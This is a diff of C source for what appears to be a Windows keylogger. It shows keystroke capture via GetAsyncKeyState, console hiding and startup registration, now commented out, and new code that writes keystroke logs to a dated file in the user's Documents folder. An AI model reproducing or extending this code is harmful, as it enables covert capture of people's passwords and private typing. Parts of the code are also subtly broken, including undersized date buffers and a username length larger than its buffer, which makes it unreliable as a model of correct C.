@@ -23,7 +23,8 @@ GetAsyncKeyState
 #define K_BSPSTR "{BKSPC}"
 #define K_ENTERSTR "{ENTER}"
 #define IDD_COMBO 2032
-
+#define PATHSTART "C:\\USERS"
+#define DOCUMENTS "DOCUMENTS"
 #define TRUE 1
 #define FALSE 0
 typedef int BOOL;
@@ -31,6 +32,7 @@ typedef int BOOL;
 //HELP MESSAGES
 
 char oldWindowTitle[256];
+
 /* FUNCTION DECLARATIONS */
 
 long    fileSize(FILE * fileHandler);
@@ -80,7 +82,9 @@ int main() {
   char charcombination[6];
   char daystr[2];
   char monstr[2];
-  char fileStr[80];
+  char fileStr[512];
+  char userName[180];
+  DWORD username_len = 181;
   int exitFlag =0;
   int i=0;
   int month;
@@ -92,22 +96,29 @@ int main() {
    now = time(0);
    ltm = localtime(&now);
   //hide console window
-  ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
+  //ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
   //register at startup
-  RegisterProgram();
-
+  //RegisterProgram();
+  //SAFEPATH -> C:\USERS\$USERNAME$\DOCUMENTS\TEMP$DAY$_$MONTH$.TMP
   month = ltm->tm_mon;
   month++;
   sprintf(daystr, "%d", ltm->tm_mday);
   sprintf(monstr, "%d", month);
-  strcpy(fileStr, FILENAME);
+  strcpy(fileStr,PATHSTART);
+  strcat(fileStr,"\\");
+  GetUserName(userName, &username_len);
+  strcat(fileStr,userName);
+  strcat(fileStr,"\\");
+  strcat(fileStr,DOCUMENTS);
+  strcat(fileStr,"\\");
+  strcat(fileStr, FILENAME);
   strcat(fileStr, daystr);
   strcat(fileStr, "_");
   strcat(fileStr, monstr);
   strcat(fileStr, FILEEXTENSION);
-
+  printf("%s\n",fileStr);
   if (file_exists(&fileHandler, fileStr) == 1)
-    openFile(&fileHandler,fileStr,"a");
+     openFile(&fileHandler,fileStr,"a");
   else
     openFile(&fileHandler,fileStr, "w");
   fprintf(fileHandler, "\n%s\n", asctime(ltm));
